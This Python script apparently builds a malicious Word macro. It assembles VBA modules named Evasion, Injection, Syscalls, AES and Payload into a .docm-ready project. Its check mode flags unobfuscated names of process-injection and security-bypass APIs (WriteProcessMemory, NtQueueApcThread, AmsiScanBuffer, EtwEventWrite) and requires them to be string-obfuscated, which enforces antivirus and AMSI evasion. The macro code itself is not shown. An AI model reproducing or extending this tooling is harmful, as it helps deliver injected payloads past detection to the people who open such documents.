"""Assemble solid-macro .bas modules into a .docm-ready VBA project.

Two modes:
  --check     Static sanity check on .bas modules (Sub/End balance, no orphan
              line continuations, no flat sensitive API literals).
  default     Emit per-module .bas files (or one flattened Module1.bas with
              --flatten) into the dist directory, ready for import into Word's
              VBA editor.
"""

from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

MODULE_ORDER = [
    "Strings",
    "Structs",
    "Engine",
    "Aes",
    "Syscalls",
    "Evasion",
    "Injection",
    "Payload",     # AUTOGENERATED by payload/build.py; required before assemble
    "SolidMacro",
    "Debug",
]

DEBUG_MODULE = "Debug"

REPO_ROOT = Path(__file__).resolve().parents[2]
DEFAULT_MACRO_DIR = REPO_ROOT / "macro"
DEFAULT_OUT_DIR = REPO_ROOT / "macro" / "build" / "dist"

SENSITIVE_LITERALS = [
    "VirtualAllocEx", "WriteProcessMemory", "CreateProcessA", "CreateProcessW",
    "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtProtectVirtualMemory",
    "NtCreateUserProcess", "NtCreateProcessEx", "NtQueueApcThread",
    "NtSetContextThread", "NtGetContextThread", "NtAddVectoredExceptionHandler",
    "NtOpenSection", "NtMapViewOfSection", "AmsiScanBuffer", "AmsiScanString",
    "EtwEventWrite", "QueueUserAPC", "ResumeThread",
    "InitializeProcThreadAttributeList", "UpdateProcThreadAttribute",
]


def read_module(macro_dir: Path, name: str) -> str:
    path = macro_dir / f"{name}.bas"
    if not path.exists():
        raise FileNotFoundError(f"Module not found: {path}")
    return path.read_text(encoding="utf-8")


def strip_comments(text: str) -> str:
    return re.sub(r"'.*$", "", text, flags=re.MULTILINE)


def check_sub_balance(name: str, text: str) -> list[str]:
    code = strip_comments(text)
    opens = len(re.findall(r"\b(?:Sub|Function)\s+\w+\s*\(", code, re.IGNORECASE))
    closes = len(re.findall(r"\bEnd\s+(?:Sub|Function)\b", code, re.IGNORECASE))
    if opens != closes:
        return [f"{name}: Sub/Function open count {opens} != End count {closes}"]
    return []


def check_orphan_continuations(name: str, text: str) -> list[str]:
    lines = text.splitlines()
    errs = []
    for i, line in enumerate(lines, 1):
        stripped = line.rstrip()
        if stripped.endswith(" _"):
            if i == len(lines):
                errs.append(f"{name}:{i}: trailing line continuation at end of file")
            elif not lines[i].strip():
                errs.append(f"{name}:{i}: line continuation followed by blank line")
    return errs


def check_sensitive_literals(name: str, text: str) -> list[str]:
    code = strip_comments(text)
    errs = []
    for lit in SENSITIVE_LITERALS:
        if f'"{lit}"' in code:
            errs.append(f"{name}: flat sensitive literal {lit!r} found (use MkStr/MkAStr)")
    return errs


def run_check(macro_dir: Path, modules: list[str], debug: bool) -> int:
    errors: list[str] = []
    targets = list(modules)
    if debug:
        targets.append(DEBUG_MODULE)
    for m in targets:
        try:
            text = read_module(macro_dir, m)
        except FileNotFoundError as e:
            errors.append(str(e))
            continue
        errors.extend(check_sub_balance(m, text))
        errors.extend(check_orphan_continuations(m, text))
        errors.extend(check_sensitive_literals(m, text))
    if errors:
        for e in errors:
            print(f"FAIL: {e}", file=sys.stderr)
        return 1
    print(f"OK: {len(targets)} module(s) passed static checks")
    return 0


def run_build(macro_dir: Path, out_dir: Path, modules: list[str], debug: bool, flatten: bool) -> int:
    out_dir.mkdir(parents=True, exist_ok=True)
    targets = list(modules)
    if debug:
        targets.append(DEBUG_MODULE)
    if flatten:
        out_path = out_dir / "Module1.bas"
        with out_path.open("w", encoding="utf-8") as f:
            f.write('Attribute VB_Name = "Module1"\n')
            for name in targets:
                text = read_module(macro_dir, name)
                f.write(f"\n'==== module: {name} ====\n")
                f.write(text)
                if not text.endswith("\n"):
                    f.write("\n")
        print(f"Wrote {out_path}")
    else:
        for name in targets:
            text = read_module(macro_dir, name)
            out_path = out_dir / f"{name}.bas"
            with out_path.open("w", encoding="utf-8") as f:
                f.write(f'Attribute VB_Name = "{name}"\n')
                f.write(text)
                if not text.endswith("\n"):
                    f.write("\n")
            print(f"Wrote {out_path}")
    return 0


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Assemble solid-macro .bas modules.")
    ap.add_argument("--check", action="store_true", help="Static check only, no output")
    ap.add_argument("--debug", action="store_true", help="Include Debug.bas")
    ap.add_argument("--flatten", action="store_true", help="Emit single Module1.bas")
    ap.add_argument("--macro-dir", type=Path, default=DEFAULT_MACRO_DIR, help="Source .bas directory")
    ap.add_argument("--out-dir", type=Path, default=DEFAULT_OUT_DIR, help="Output directory")
    args = ap.parse_args(argv)
    if args.check:
        return run_check(args.macro_dir, MODULE_ORDER, args.debug)
    return run_build(args.macro_dir, args.out_dir, MODULE_ORDER, args.debug, args.flatten)


if __name__ == "__main__":
    sys.exit(main())
